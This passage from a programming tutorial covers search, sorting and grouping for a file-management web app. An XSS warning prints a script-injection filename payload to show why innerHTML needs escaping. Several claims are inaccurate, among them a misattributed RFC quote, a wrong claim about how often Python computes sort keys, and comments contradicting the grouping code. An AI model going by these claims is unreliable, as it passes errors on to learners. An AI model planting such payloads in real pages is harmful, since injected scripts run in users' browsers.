const params = new URLSearchParams('tag=urgent&tag=review');
params.getAll('tag');  // ['urgent', 'review']
```

---

### **Part 4: Backend Filtering - Algorithm Complexity**

Your tutorial filters files on the server:

```python
if search:
    repo_files = [f for f in repo_files if search.lower() in f.lower()]
```

**Time Complexity Analysis:**

```python
# Let:
# n = number of files
# m = average filename length
# k = search term length

# List comprehension:
filtered = [f for f in repo_files if search.lower() in f.lower()]

# Breakdown:
# - For loop: n iterations
# - search.lower(): O(k) per iteration (should be hoisted!)
# - f.lower(): O(m) per iteration
# - "in" operator: O(m * k) worst case (substring search)

# Total: O(n * m * k)
```

**Optimization: Hoist invariant computation**

```python
# SLOW:
if search:
    repo_files = [f for f in repo_files if search.lower() in f.lower()]
    # Converts search.lower() n times!

# FAST:
if search:
    search_lower = search.lower()  # Compute once!
    repo_files = [f for f in repo_files if search_lower in f.lower()]
    # Now: O(n * m * k) → O(k + n * m * k) but k term is outside loop
```

**When to search on client vs server:**

```
Client-Side Search (JavaScript):
───────────────────────────────────
Pros:
✓ Instant results (no network)
✓ Works offline
✓ Reduces server load

Cons:
✗ Must load ALL data first
✗ Memory intensive
✗ Not suitable for large datasets

Best for: < 1000 items

Server-Side Search (Python):
───────────────────────────────────
Pros:
✓ Can search millions of records
✓ Can use database indexes
✓ Memory efficient (pagination)

Cons:
✗ Network latency
✗ Server load
✗ Requires backend implementation

Best for: > 1000 items

Your app: Server-side is correct choice!
Files can grow unbounded, and you're already making an API call.
```

---

### **Part 5: The Browser's Autocomplete Cache**

When you type in a search box, the browser may show previous searches:

**How browser autocomplete works:**

```javascript
// Browser maintains SQLite database:
// ~/.config/google-chrome/Default/History

CREATE TABLE autofill (
    name TEXT,           -- Input name/id
    value TEXT,          -- User's input
    date_created INTEGER,
    count INTEGER        -- How many times used
);

// When you type:
// 1. Browser queries this database
// 2. Filters by input name
// 3. Shows dropdown with previous values
// 4. Sorts by frequency (count) and recency
```

**Disabling autocomplete:**

```html
<!-- Prevent browser from caching search terms -->
<input type="text" id="search-box" autocomplete="off" spellcheck="false" />

<!-- Why disable?
     - Sensitive data (passwords, SSN)
     - Confusing suggestions
     - Custom search implementation
-->
```

---

### **Part 6: Input Events - The Event Timeline**

```javascript
searchBox.addEventListener(
  "input",
  debounce(() => {
    loadFiles(searchBox.value);
  }, 300)
);
```

**What 'input' event captures:**

```
Input events fire on:
✓ Typing (keypress)
✓ Paste (Ctrl+V)
✓ Cut (Ctrl+X)
✓ Delete/Backspace
✓ Autocomplete selection
✓ Speech-to-text input

Alternative events:
- 'keydown': Fires BEFORE character appears
- 'keyup': Fires AFTER character appears
- 'change': Fires only when input loses focus
```

**Event timeline for typing:**

```
User presses 'A' key:

1. keydown event
   - event.key = 'a'
   - event.code = 'KeyA'
   - input.value = "" (not updated yet)

2. input event
   - input.value = "a" (NOW updated)

3. keyup event
   - input.value = "a"
```

**Why 'input' is better than 'keyup' for search:**

```javascript
// With keyup:
searchBox.addEventListener("keyup", () => {
  search(searchBox.value);
});

// Misses: Paste, drag-and-drop, autocomplete
// User pastes "1234567" → No keyup event!

// With input:
searchBox.addEventListener("input", () => {
  search(searchBox.value);
});

// Catches: ALL ways value can change
```

---

### **Part 7: Search Result Highlighting (Advanced Feature)**

**Enhance your search by highlighting matched text:**

```javascript
function renderFilesWithHighlight(files, searchTerm) {
  const searchLower = searchTerm.toLowerCase();

  files.forEach((file) => {
    const nameLower = file.name.toLowerCase();
    const index = nameLower.indexOf(searchLower);

    let displayName;
    if (index !== -1) {
      // Found match - highlight it
      const before = file.name.substring(0, index);
      const match = file.name.substring(index, index + searchTerm.length);
      const after = file.name.substring(index + searchTerm.length);

      displayName = `${before}<mark>${match}</mark>${after}`;
    } else {
      displayName = file.name;
    }

    // Use displayName in HTML
  });
}
```

**The `<mark>` element:**

```html
<!-- Semantic HTML for highlighting -->
<mark>highlighted text</mark>

<!-- Default browser styles: -->
mark { background-color: yellow; color: black; }

<!-- Custom styling: -->
mark { background-color: #ffd700; padding: 2px 4px; border-radius: 3px; }
```

**XSS Security Warning:**

```javascript
// VULNERABLE:
displayName = `${before}<mark>${match}</mark>${after}`;
element.innerHTML = displayName; // Unsafe if file.name has HTML!

// If filename is: <script>alert('XSS')</script>
// You just injected executable code!

// SAFE:
function escapeHTML(str) {
  const div = document.createElement("div");
  div.textContent = str; // Sets as text, not HTML
  return div.innerHTML; // Get escaped version
}

displayName = `${escapeHTML(before)}<mark>${escapeHTML(
  match
)}</mark>${escapeHTML(after)}`;
```

---

### **Practice Exercise: Implement Fuzzy Search**

Enhance the search to match even with typos:

```javascript
// Levenshtein distance: Edit distance between strings
function levenshteinDistance(a, b) {
  const matrix = [];

  // Initialize first column (insertions)
  for (let i = 0; i <= a.length; i++) {
    matrix[i] = [i];
  }

  // Initialize first row (deletions)
  for (let j = 0; j <= b.length; j++) {
    matrix[0][j] = j;
  }

  // Fill matrix
  for (let i = 1; i <= a.length; i++) {
    for (let j = 1; j <= b.length; j++) {
      if (a[i - 1] === b[j - 1]) {
        matrix[i][j] = matrix[i - 1][j - 1]; // No change needed
      } else {
        matrix[i][j] = Math.min(
          matrix[i - 1][j] + 1, // Deletion
          matrix[i][j - 1] + 1, // Insertion
          matrix[i - 1][j - 1] + 1 // Substitution
        );
      }
    }
  }

  return matrix[a.length][b.length];
}

// Usage:
levenshteinDistance("kitten", "sitting"); // 3
// kitten → sitten (substitute k→s)
// sitten → sittin (substitute e→i)
// sittin → sitting (insert g)

// Apply to search:
const maxDistance = 2; // Allow 2-character difference
const results = files.filter((file) => {
  return (
    levenshteinDistance(searchTerm.toLowerCase(), file.name.toLowerCase()) <=
    maxDistance
  );
});
```

**Time complexity:** O(n _ m) where n, m are string lengths  
**Space complexity:** O(n _ m) for matrix

---

Ready for Level 9 (Adding Sorting Capabilities) when you've absorbed this. Next level covers sorting algorithms, multiple sort keys, and stable vs unstable sorts.

## **Level 9 Enhancement: Adding Sorting Capabilities**

**Brief note on your university comment:** While this tutorial covers practical CS fundamentals deeply, university provides structured theoretical foundations (formal verification, complexity theory, advanced algorithms) and credentials that matter for career opportunities. This is supplementary learning, not a replacement. Now let's continue.

---

**Reference:** Your tutorial adds sort buttons for name/status with ascending/descending order.

**Depth Needed:** Sorting is one of the most studied problems in CS. Let me unpack the algorithms, stability properties, and the multi-key sorting problem.

---

### **Part 1: Sorting Algorithms - The Theoretical Foundation**

**The Sorting Problem (Formal Definition):**

```
Input: Array A of n comparable elements
Output: Permutation of A where A[i] ≤ A[i+1] for all i

Comparison-based sorting lower bound: Ω(n log n)
Proof: Decision tree has n! leaves (all permutations)
       Height ≥ log₂(n!) ≈ n log n
```

**Python's `sort()` - What Algorithm Does It Use?**

```python
files_to_return.sort(key=lambda item: item['name'].lower())
```

Python uses **Timsort** (invented by Tim Peters in 2002):

```
Timsort = Merge Sort + Insertion Sort + Galloping Mode

Why hybrid?
- Insertion sort: O(n²) worst, but O(n) on nearly-sorted data
- Merge sort: O(n log n) always, but O(n) extra space
- Timsort: Detects existing order, exploits it

Properties:
- Time: O(n log n) worst case
- Space: O(n) auxiliary
- Stable: Yes (preserves equal elements' order)
- Adaptive: Fast on partially sorted data
```

**Timsort Implementation (Simplified):**

```python
def timsort(arr, key=lambda x: x):
    # 1. Find "runs" (already-sorted subsequences)
    runs = find_runs(arr, key)
    # runs = [[sorted_chunk_1], [sorted_chunk_2], ...]

    # 2. Merge runs using merge sort
    while len(runs) > 1:
        # Take two adjacent runs
        run1 = runs.pop()
        run2 = runs.pop()

        # Merge them
        merged = merge(run1, run2, key)
        runs.append(merged)

    return runs[0]

def find_runs(arr, key):
    """Find naturally occurring sorted sequences."""
    runs = []
    i = 0

    while i < len(arr):
        run = [arr[i]]
        i += 1

        # Extend run while sorted
        while i < len(arr) and key(arr[i]) >= key(arr[i-1]):
            run.append(arr[i])
            i += 1

        # If run is descending, reverse it
        if i < len(arr) and key(arr[i]) < key(arr[i-1]):
            while i < len(arr) and key(arr[i]) < key(arr[i-1]):
                run.append(arr[i])
                i += 1
            run.reverse()

        # Run too small? Use insertion sort to extend
        MIN_RUN = 32
        while len(run) < MIN_RUN and i < len(arr):
            # Insert arr[i] into sorted run
            insert_sorted(run, arr[i], key)
            i += 1

        runs.append(run)

    return runs
```

**Why Timsort is brilliant:**

```python
# Test case: Already sorted array
arr = list(range(1000000))
arr.sort()  # Takes ~0.001s (O(n) time!)

# Traditional merge sort would take O(n log n) even on sorted input
# Timsort detects it's sorted in one pass: O(n)

# Test case: Reverse sorted
arr = list(range(1000000, 0, -1))
arr.sort()  # Takes ~0.002s
# Detects descending run, reverses it in O(n), done!

# Test case: Random data
arr = [random.randint(0, 1000000) for _ in range(1000000)]
arr.sort()  # Takes ~0.15s (O(n log n))
# Falls back to merge sort behavior
```

---

### **The `key` Parameter - Transform Before Compare**

```python
files_to_return.sort(key=lambda item: item['name'].lower())
```

**What this does algorithmically:**

```python
# Naive approach (BAD):
def sort_case_insensitive(arr):
    # Compare using lower() each time
    return sorted(arr, key=lambda x: x.lower())
    # Calls x.lower() O(n log n) times during comparisons!

# Python's optimization (GOOD):
def sort_with_key(arr, key_func):
    # 1. Decorate: Create (key, original_value) pairs
    decorated = [(key_func(item), item) for item in arr]
    # Calls key_func exactly n times

    # 2. Sort: Compare using keys
    decorated.sort(key=lambda pair: pair[0])

    # 3. Undecorate: Extract original values
    return [item for (_, item) in decorated]

# This is called "Decorate-Sort-Undecorate" (DSU) pattern
# Also known as "Schwartzian Transform" (from Perl)
```

**Time complexity analysis:**

```
Without key function:
- Comparisons: O(n log n)
- Per comparison: O(1)
- Total: O(n log n)

With key function (naive):
- Comparisons: O(n log n)
- Per comparison: O(k) where k = key computation cost
- Total: O(k * n log n)

With key function (DSU):
- Decorate: O(k * n)
- Sort: O(n log n) comparisons, O(1) per comparison
- Undecorate: O(n)
- Total: O(k * n + n log n) = O(k * n) if k > log n

For your case (lowercase conversion):
k = m (string length)
Without DSU: O(m * n log n)
With DSU: O(m * n + n log n) ≈ O(m * n)
```

---

### **Part 2: Stable vs Unstable Sorts**

**Stability Definition:**

```
A sort is stable if equal elements maintain their relative order.

Example:
Input:  [(3, 'a'), (1, 'b'), (3, 'c'), (2, 'd')]
        Sort by first element (number)

Stable sort:   [(1, 'b'), (2, 'd'), (3, 'a'), (3, 'c')]
                                     ↑____________↑
                                     Original order preserved

Unstable sort: [(1, 'b'), (2, 'd'), (3, 'c'), (3, 'a')]
                                     ↑____________↑
                                     Order might change
```

**Why stability matters in your application:**

```python
# Your files have multiple properties:
files = [
    {"name": "PN1001_OP1.mcam", "status": "available", "revision": 3},
    {"name": "PN1001_OP2.mcam", "status": "available", "revision": 1},
    {"name": "PN1002_OP1.mcam", "status": "checked_out", "revision": 2},
]

# Sort by status (grouping)
files.sort(key=lambda f: f['status'])

# Then sort by name within each group
# Stable sort preserves status grouping!
files.sort(key=lambda f: f['name'])

# Result: Files grouped by status, and alphabetical within each group
```

**Common sorting algorithms and stability:**

```
Algorithm        Time Complexity      Space    Stable?
──────────────────────────────────────────────────────
Bubble Sort      O(n²)               O(1)     Yes
Insertion Sort   O(n²)               O(1)     Yes
Selection Sort   O(n²)               O(1)     No
Merge Sort       O(n log n)          O(n)     Yes
Quick Sort       O(n log n) avg      O(log n) No*
Heap Sort        O(n log n)          O(1)     No
Timsort          O(n log n)          O(n)     Yes

* Quick sort can be made stable but Python's doesn't
```

---

### **Part 3: Multi-Key Sorting (The Tuple Trick)**

Your tutorial sorts by one key at a time. Here's how to sort by multiple:

**Method 1: Tuple keys (Python's approach):**

```python
# Sort by status, then by name
files.sort(key=lambda f: (f['status'], f['name'].lower()))

# How tuple comparison works:
(1, 'b') < (1, 'c')  # Compare first elements: 1 == 1
                     # Tie! Compare second: 'b' < 'c'
                     # Result: True

(1, 'c') < (2, 'a')  # Compare first: 1 < 2
                     # Result: True (don't even check second)
```

**The tuple comparison algorithm:**

```python
def tuple_compare(t1, t2):
    """
    Lexicographic comparison (like dictionary order).

    Time Complexity: O(min(len(t1), len(t2)))
    """
    for i in range(min(len(t1), len(t2))):
        if t1[i] < t2[i]:
            return -1  # t1 < t2
        elif t1[i] > t2[i]:
            return 1   # t1 > t2
        # Equal, continue to next element

    # All compared elements equal
    # Shorter tuple is "less than"
    if len(t1) < len(t2):
        return -1
    elif len(t1) > len(t2):
        return 1
    else:
        return 0  # Completely equal
```

**Reversing individual sort keys:**

```python
# Problem: Want status ascending, but name descending
# Can't do: files.sort(key=lambda f: (f['status'], f['name']), reverse=True)
# That reverses BOTH keys!

# Solution 1: Negate numeric keys
files.sort(key=lambda f: (f['status'], -f['revision']))
# Status ascending, revision descending

# Solution 2: Reverse wrapper class
class ReverseCompare:
    def __init__(self, obj):
        self.obj = obj

    def __lt__(self, other):
        return self.obj > other.obj  # Reverse comparison

    def __gt__(self, other):
        return self.obj < other.obj

files.sort(key=lambda f: (f['status'], ReverseCompare(f['name'])))
```

**Method 2: Multiple sort passes (less efficient):**

```python
# Sort by least significant key first, then more significant
# Exploits stable sort property

files.sort(key=lambda f: f['name'])      # Sort by name
files.sort(key=lambda f: f['status'])    # Sort by status (preserves name order)

# Why this works:
# 1. After first sort, files ordered by name
# 2. Second sort groups by status
# 3. Stable sort preserves name order within each status group

# Time complexity: O(n log n) + O(n log n) = O(n log n)
# But 2× the constant factor compared to single sort with tuple key
```

---

### **Part 4: Your Sorting Implementation - Code Analysis**

```python
is_reverse = (order == 'desc')
if sort_by == 'name':
    files_to_return.sort(key=lambda item: item['name'].lower(), reverse=is_reverse)
elif sort_by == 'status':
    files_to_return.sort(key=lambda item: item['status'], reverse=is_reverse)
```

**Memory implications:**

```python
# In-place sort (your approach):
files_to_return.sort(key=...)
# Modifies original list
# Space: O(n) for Timsort's merge buffer
# Original list is reordered

# Alternative: sorted() function
files_sorted = sorted(files_to_return, key=...)
# Creates new list
# Space: O(n) for new list + O(n) for merge buffer = O(2n)
# Original list unchanged

# Your choice of .sort() is correct for web APIs
# No need to preserve original order
```

**String comparison in different languages:**

```python
# Python (lexicographic, Unicode order):
'A' < 'Z' < 'a' < 'z'  # True (uppercase before lowercase)
# ord('A') = 65, ord('Z') = 90
# ord('a') = 97, ord('z') = 122

'10' < '2'  # True (string comparison, not numeric!)
# Compares character-by-character: '1' < '2'

# Natural sort (what humans expect):
import re

def natural_sort_key(s):
    """Convert string to list of strings and integers for natural sorting."""
    return [int(text) if text.isdigit() else text.lower()
            for text in re.split('([0-9]+)', s)]

files = ['file2.txt', 'file10.txt', 'file1.txt']
sorted(files)  # ['file1.txt', 'file10.txt', 'file2.txt'] - Wrong!
sorted(files, key=natural_sort_key)  # ['file1.txt', 'file2.txt', 'file10.txt'] - Correct!
```

---

### **Part 5: Frontend Sort State Management**

```javascript
let currentSortBy = "name";
let currentOrder = "asc";
```

**Why global state instead of reading DOM:**

```javascript
// BAD: Query DOM every time
function loadFiles() {
  const activeBtn = document.querySelector(".sort-btn.active");
  const sortBy = activeBtn.dataset.sortBy;
  const order = activeBtn.dataset.order;
  // DOM query is O(n) where n = number of buttons
}

// GOOD: Maintain state in memory
let currentSortBy = "name"; // O(1) access

// Trade-off:
// - More memory (2 variables)
// + Faster access
// + Single source of truth
```

**State synchronization problem:**

```
State exists in two places:
1. JavaScript variables (currentSortBy, currentOrder)
2. DOM (.active class on button)

These can get out of sync:

Time  JavaScript    DOM              Problem?
────────────────────────────────────────────────
t0    name, asc     btn1.active      ✓ Synced
t1    status, asc   btn1.active      ✗ Out of sync!
```

**Solution pattern: Single Source of Truth**

```javascript
// State object
const sortState = {
  by: "name",
  order: "asc",

  // Setter ensures DOM is updated
  setSortBy(by, order) {
    this.by = by;
    this.order = order;
    this._updateDOM();
  },

  _updateDOM() {
    // Remove all active classes
    document.querySelectorAll(".sort-btn").forEach((btn) => {
      btn.classList.remove("active");
    });

    // Add active to matching button
    const selector = `.sort-btn[data-sort-by="${this.by}"][data-order="${this.order}"]`;
    document.querySelector(selector)?.classList.add("active");
  },
};

// Usage:
sortBtn.addEventListener("click", () => {
  sortState.setSortBy(sortBtn.dataset.sortBy, sortBtn.dataset.order);
  loadFiles();
});
```

---

### **Part 6: URL Query String Building**

```javascript
const params = new URLSearchParams({
  sort_by: currentSortBy,
  order: currentOrder,
});
```

**Order of query parameters (does it matter?):**

```
Question: Are these URLs equivalent?

/api/files?sort_by=name&order=asc
/api/files?order=asc&sort_by=name

Answer: Yes! Order doesn't matter for parameters.
The server parses both into the same dict/object.

HTTP/1.1 specification (RFC 3986):
"The order of parameters is not significant."
```

**URLSearchParams vs manual string building:**

```javascript
// MANUAL (error-prone):
let url = "/api/files?";
const parts = [];
if (currentSortBy) parts.push(`sort_by=${currentSortBy}`);
if (currentOrder) parts.push(`order=${currentOrder}`);
url += parts.join("&");

// Problems:
// 1. No encoding (breaks with special chars)
// 2. Verbose (manual array management)
// 3. Easy to forget edge cases

// URLSEARCHPARAMS (correct):
const params = new URLSearchParams({
  sort_by: currentSortBy,
  order: currentOrder,
});
const url = `/api/files?${params}`;

// Benefits:
// 1. Automatic encoding
// 2. Clean syntax
// 3. Handles edge cases (empty values, special chars)
```

**Empty parameter handling:**

```javascript
const params = new URLSearchParams({
  sort_by: currentSortBy,
  order: currentOrder,
  search: "", // Empty string
});

console.log(params.toString());
// "sort_by=name&order=asc&search="
// Empty search still appears!

// Better:
const params = new URLSearchParams({
  sort_by: currentSortBy,
  order: currentOrder,
});
if (searchTerm) {
  // Only add if non-empty
  params.append("search", searchTerm);
}
// "sort_by=name&order=asc"
```

---

### **Part 7: Comparison Functions (The Core Primitive)**

**All sorting relies on comparison:**

```python
# Python uses rich comparison methods
class File:
    def __init__(self, name, status):
        self.name = name
        self.status = status

    def __lt__(self, other):
        """Less than: self < other"""
        return self.name < other.name

    def __le__(self, other):
        """Less than or equal: self <= other"""
        return self.name <= other.name

    def __gt__(self, other):
        """Greater than: self > other"""
        return self.name > other.name

    def __ge__(self, other):
        """Greater than or equal: self >= other"""
        return self.name >= other.name

    def __eq__(self, other):
        """Equal: self == other"""
        return self.name == other.name

    def __ne__(self, other):
        """Not equal: self != other"""
        return self.name != other.name

# With these defined, can sort:
files = [File('b', 'ok'), File('a', 'ok'), File('c', 'ok')]
files.sort()  # Uses __lt__ for comparisons
```

**The comparison contract:**

```
For comparison to work correctly, must satisfy:

1. Reflexivity: a == a (always true)
2. Symmetry: if a == b then b == a
3. Transitivity: if a == b and b == c, then a == c
4. Antisymmetry: if a <= b and b <= a, then a == b
5. Totality: for any a, b: either a < b, a == b, or a > b

Breaking these causes undefined behavior!
```

**Example of broken comparison:**

```python
class BadComparison:
    def __init__(self, value):
        self.value = value

    def __lt__(self, other):
        # Broken: comparison involves randomness!
        return self.value + random.random() < other.value

objects = [BadComparison(i) for i in range(100)]
objects.sort()  # May crash or produce nonsense!

# Violates transitivity:
# a < b and b < c doesn't guarantee a < c
# Sort algorithm assumes this, gets confused
```

---

### **Part 8: Sorting Complexity Classes**

**Best, Average, Worst Case Analysis:**

```
Algorithm: Quicksort

Best Case: O(n log n)
- Pivot always splits array evenly
- T(n) = 2T(n/2) + O(n)
- Master theorem: T(n) = O(n log n)

Average Case: O(n log n)
- Pivot splits "reasonably well" on average
- Mathematical expectation over all inputs

Worst Case: O(n²)
- Pivot is always smallest/largest element
- T(n) = T(n-1) + O(n)
- Example: Sorting already-sorted array
- T(n) = (n-1) + (n-2) + ... + 1 = n(n-1)/2 = O(n²)
```

**Recurrence relation for merge sort:**

```
T(n) = 2T(n/2) + O(n)
       ↑         ↑
       Split     Merge
       into 2    takes n
       halves    comparisons

Solving:
T(n) = 2T(n/2) + cn
     = 2(2T(n/4) + cn/2) + cn
     = 4T(n/4) + 2cn
     = 4(2T(n/8) + cn/4) + 2cn
     = 8T(n/8) + 3cn

Pattern: 2^k T(n/2^k) + kcn
When n/2^k = 1, k = log₂ n
So: T(n) = n·T(1) + cn log₂ n
         = O(n) + O(n log n)
         = O(n log n)
```

---

### **Practice Exercise 1: Implement Insertion Sort**

Understanding simple algorithms helps appreciate complex ones:

```python
def insertion_sort(arr, key=lambda x: x):
    """
    Insertion sort: Build sorted array one element at a time.

    Imagine sorting playing cards:
    - Pick up cards one by one
    - Insert each into correct position in hand

    Time: O(n²) worst, O(n) best (already sorted)
    Space: O(1)
    Stable: Yes
    """
    for i in range(1, len(arr)):
        # arr[0:i] is already sorted
        # Insert arr[i] into correct position

        current = arr[i]
        current_key = key(current)

        # Shift larger elements right
        j = i - 1
        while j >= 0 and key(arr[j]) > current_key:
            arr[j + 1] = arr[j]  # Shift right
            j -= 1

        # Insert current
        arr[j + 1] = current

    return arr

# Test:
files = [
    {"name": "C.txt", "size": 300},
    {"name": "A.txt", "size": 100},
    {"name": "B.txt", "size": 200}
]

insertion_sort(files, key=lambda f: f['name'])
# Result: [A.txt, B.txt, C.txt]

# Trace for 3 elements:
# Initial: [C, A, B]
#
# i=1: Insert A
#   [C, A, B]  → Compare A with C: A < C
#   [C, C, B]  → Shift C right
#   [A, C, B]  → Insert A
#
# i=2: Insert B
#   [A, C, B]  → Compare B with C: B < C
#   [A, C, C]  → Shift C right
#   [A, B, C]  → Insert B (B > A, stop)
```

---

### **Practice Exercise 2: Visualize Sort Performance**

```javascript
// Measure and compare sort strategies
function benchmarkSort() {
  const sizes = [100, 1000, 10000];
  const results = {};

  for (const n of sizes) {
    // Generate test data
    const data = Array.from({ length: n }, () => ({
      name: Math.random().toString(36),
      value: Math.random(),
    }));

    // Test 1: Sort by one key
    const data1 = [...data];
    console.time(`Single sort n=${n}`);
    data1.sort((a, b) => a.name.localeCompare(b.name));
    console.timeEnd(`Single sort n=${n}`);

    // Test 2: Sort by multiple keys (tuple)
    const data2 = [...data];
    console.time(`Tuple sort n=${n}`);
    data2.sort((a, b) => {
      if (a.value !== b.value) return a.value - b.value;
      return a.name.localeCompare(b.name);
    });
    console.timeEnd(`Tuple sort n=${n}`);

    // Test 3: Multiple passes
    const data3 = [...data];
    console.time(`Multi-pass n=${n}`);
    data3.sort((a, b) => a.name.localeCompare(b.name));
    data3.sort((a, b) => a.value - b.value);
    console.timeEnd(`Multi-pass n=${n}`);
  }
}

// Run in browser console
benchmarkSort();

// Expected results:
// Single sort fastest (one pass)
// Tuple sort slightly slower (more comparisons per element)
// Multi-pass slowest (two full sorts)
```

---

### **Practice Exercise 3: Implement Natural Sort**

```python
def natural_sort_key(filename):
    """
    Natural sort: Humans expect "file2" before "file10".

    Algorithm:
    1. Split string into text and number parts
    2. Compare text parts alphabetically
    3. Compare number parts numerically
    """
    import re

    parts = []
    for part in re.split(r'(\d+)', filename):
        if part.isdigit():
            parts.append(int(part))  # Compare as number
        else:
            parts.append(part.lower())  # Compare as string
    return parts

# Test:
files = [
    'file1.txt',
    'file10.txt',
    'file2.txt',
    'file20.txt',
    'file3.txt'
]

# Standard sort (wrong):
print(sorted(files))
# ['file1.txt', 'file10.txt', 'file2.txt', 'file20.txt', 'file3.txt']

# Natural sort (correct):
print(sorted(files, key=natural_sort_key))
# ['file1.txt', 'file2.txt', 'file3.txt', 'file10.txt', 'file20.txt']

# How it works:
natural_sort_key('file10.txt')  # Returns: ['file', 10, '.txt']
natural_sort_key('file2.txt')   # Returns: ['file', 2, '.txt']

# Python compares tuples element by element:
# ['file', 2, '.txt'] < ['file', 10, '.txt']
#          ↑              ↑
#         2 < 10, so first is less
```

---

### **Practice Exercise 4: Stable Sort Verification**

```python
def verify_stability(sort_func):
    """
    Test if a sort function is stable.
    Stable = equal elements maintain relative order
    """
    # Create data with duplicate keys but unique identifiers
    data = [
        {'key': 3, 'id': 'a'},
        {'key': 1, 'id': 'b'},
        {'key': 3, 'id': 'c'},
        {'key': 2, 'id': 'd'},
        {'key': 3, 'id': 'e'}
    ]

    # Sort by key
    sorted_data = sort_func(data, key=lambda x: x['key'])

    # Check relative order of elements with key=3
    threes = [item['id'] for item in sorted_data if item['key'] == 3]

    # Should maintain original order: ['a', 'c', 'e']
    return threes == ['a', 'c', 'e']

# Test Python's sort (should be stable):
print(verify_stability(lambda arr, key: sorted(arr, key=key)))
# True

# Test unstable quicksort implementation:
def quicksort_unstable(arr, key=lambda x: x):
    # ... implementation that's not stable ...
    pass

print(verify_stability(quicksort_unstable))
# False
```

---

Ready for Level 10 (A Major Refactor - Grouping by Part Family) when you're ready. Next level covers data structure refactoring, group-by algorithms, and maintaining backward compatibility during schema changes.

## **Level 10 Enhancement: A Major Refactor - Grouping by Part Family**

**Reference:** Your tutorial transforms the flat file list into grouped data structure based on part number prefix.

**Depth Needed:** This level represents a fundamental data structure transformation. We're converting a flat array into a hierarchical structure - a common pattern in data processing. Let me unpack the algorithms, the reduce pattern, and the complexity considerations.

---

### **Part 1: The Group-By Problem (Fundamental Algorithm)**

**The Abstract Problem:**

```
Input:  Collection of items
        Grouping function: item → group_key
Output: Map of group_key → [items in that group]

Example:
Items: [🍎, 🍊, 🍎, 🍌, 🍊, 🍎]
Group by: color
Output: {
    red: [🍎, 🍎, 🍎],
    orange: [🍊, 🍊],
    yellow: [🍌]
}
```

**Your specific case:**

```python
# Input: Flat list of files
[
    {"name": "1234567-A.mcam", ...},
    {"name": "1234567-B.mcam", ...},
    {"name": "1122333-A.mcam", ...}
]

# Group by: First 7 digits of filename
# Output: Nested structure
[
    {
        "group_name": "12-XXXXX",
        "files": [
            {"name": "1234567-A.mcam", ...},
            {"name": "1234567-B.mcam", ...}
        ]
    },
    {
        "group_name": "11-XXXXX",
        "files": [
            {"name": "1122333-A.mcam", ...}
        ]
    }
]
```

---

### **The Group-By Algorithm (Step by Step)**

**Algorithm 1: Using Dictionary Accumulator (Your Tutorial's Approach)**

```python
def group_by(items, key_func):
    """
    Generic group-by implementation.

    Time Complexity: O(n) where n = len(items)
    Space Complexity: O(n) for the groups dictionary

    Args:
        items: Iterable of items to group
        key_func: Function that extracts group key from item

    Returns:
        Dictionary mapping keys to lists of items
    """
    groups = {}  # Hash table: O(1) average lookup/insert

    for item in items:
        key = key_func(item)

        # Check if key exists
        if key not in groups:
            groups[key] = []  # Initialize new group

        groups[key].append(item)  # O(1) amortized append

    return groups

# Your tutorial's specific implementation:
groups = {}
for file_obj in all_files:
    # Extract part number (first 7 digits)
    if len(file_obj['name']) >= 2 and file_obj['name'][:2].isdigit():
        group_key = f"{file_obj['name'][:2]}-XXXXX"
    else:
        group_key = "Other-Files"

    if group_key not in groups:
        groups[group_key] = []

    groups[group_key].append(file_obj)
```

**Detailed Execution Trace:**

```python
# Input files:
files = [
    {"name": "1234567-A.mcam"},
    {"name": "1234568-B.mcam"},
    {"name": "1122333-C.mcam"}
]

# Iteration 1: "1234567-A.mcam"
groups = {}
key = "12-XXXXX"  # Extract first 2 digits
"12-XXXXX" not in groups  # True
groups["12-XXXXX"] = []  # Create new list
groups["12-XXXXX"].append(file1)
# groups = {"12-XXXXX": [file1]}

# Iteration 2: "1234568-B.mcam"
key = "12-XXXXX"  # Same prefix!
"12-XXXXX" not in groups  # False
groups["12-XXXXX"].append(file2)
# groups = {"12-XXXXX": [file1, file2]}

# Iteration 3: "1122333-C.mcam"
key = "11-XXXXX"  # Different prefix
"11-XXXXX" not in groups  # True
groups["11-XXXXX"] = []
groups["11-XXXXX"].append(file3)
# groups = {
#     "12-XXXXX": [file1, file2],
#     "11-XXXXX": [file3]
# }
```

---

### **Alternative Implementations (Learning Different Patterns)**

**Algorithm 2: Using defaultdict (Cleaner)**

```python
from collections import defaultdict

def group_by_defaultdict(items, key_func):
    """
    Using defaultdict eliminates the 'if key not in dict' check.

    Time: O(n)
    Space: O(n)
    """
    groups = defaultdict(list)  # Automatically creates empty list for new keys

    for item in items:
        key = key_func(item)
        groups[key].append(item)  # No check needed!

    return dict(groups)  # Convert back to regular dict

# Usage:
groups = group_by_defaultdict(
    files,
    key_func=lambda f: f['name'][:2] + "-XXXXX"
)
```

**How defaultdict works internally:**

```python
# Simplified implementation
class defaultdict:
    def __init__(self, default_factory):
        self._dict = {}
        self._default_factory = default_factory

    def __getitem__(self, key):
        if key not in self._dict:
            # Call factory function to create default value
            self._dict[key] = self._default_factory()
        return self._dict[key]

    def __setitem__(self, key, value):
        self._dict[key] = value

# When you do:
groups = defaultdict(list)
groups["new_key"].append(item)

# It's equivalent to:
if "new_key" not in groups:
    groups["new_key"] = list()  # Call list() to create []
groups["new_key"].append(item)
```

**Algorithm 3: Using itertools.groupby (Requires Pre-Sorting)**

```python
from itertools import groupby

def group_by_itertools(items, key_func):
    """
    itertools.groupby requires items to already be sorted by key!

    Time: O(n log n) for sorting + O(n) for grouping = O(n log n)
    Space: O(n)

    Less efficient than dictionary approach, but useful for streaming data.
    """
    # MUST sort first!
    sorted_items = sorted(items, key=key_func)

    groups = {}
    for key, group_iter in groupby(sorted_items, key=key_func):
        groups[key] = list(group_iter)  # Consume iterator

    return groups

# Why sorting is required:
items = ['A1', 'B1', 'A2', 'B2']
# Without sorting, groupby produces:
# [('A', ['A1']), ('B', ['B1']), ('A', ['A2']), ('B', ['B2'])]
# TWO separate groups for 'A' and 'B'!

# After sorting: ['A1', 'A2', 'B1', 'B2']
# groupby produces:
# [('A', ['A1', 'A2']), ('B', ['B1', 'B2'])]
# Correct!
```

**Algorithm 4: SQL-Style Group By (For Reference)**

```sql
-- In SQL, your grouping would be:
SELECT
    SUBSTR(filename, 1, 2) || '-XXXXX' as group_name,
    filename,
    status,
    -- ... other columns
FROM files
GROUP BY SUBSTR(filename, 1, 2)
ORDER BY group_name;

-- SQL engine internally uses hash-based grouping:
-- Same O(n) algorithm as Python dictionary approach
```

---

### **Part 2: The Map-Reduce Pattern**

Your grouping operation is part of a fundamental pattern: **Map-Reduce**

**The Pattern:**

```
